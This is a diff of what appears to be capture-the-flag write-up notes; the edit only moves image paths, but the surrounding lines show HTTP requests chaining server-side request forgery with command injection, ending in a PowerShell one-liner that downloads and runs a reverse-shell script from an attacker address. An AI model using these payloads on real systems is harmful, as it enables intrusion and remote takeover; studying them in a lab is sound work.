@@ -37,7 +37,7 @@ Sec-GPC: 1
 
 ```
 
-![[Pasted image 20240330014126.png]]
+![[Images/Pasted image 20240330014126.png]]
 
 ```http
 GET /?r=hello HTTP/1.1
@@ -54,7 +54,7 @@ Sec-GPC: 1
 
 ```
 
-![[Pasted image 20240330014221.png]]
+![[Images/Pasted image 20240330014221.png]]
 
 ```http
 GET /?r=http%3A%2F%2Finternal.ironcorp.me%3A11025%2Fname.php%3Fname%3Dadmin|whoami HTTP/1.1
@@ -73,7 +73,7 @@ Sec-GPC: 1
 
 ```
 
-![[Pasted image 20240330011031.png]]
+![[Images/Pasted image 20240330011031.png]]
 
 ```http
 GET /?r=http%3A%2F%2Finternal.ironcorp.me%3A11025%2Fname.php%3Fname%3Dadmin|powershell.exe%2b-c%2biex(new-object%2bnet.webclient).downloadstring('http%253a//10.18.21.236%253a8000/revshk.ps1') HTTP/1.1
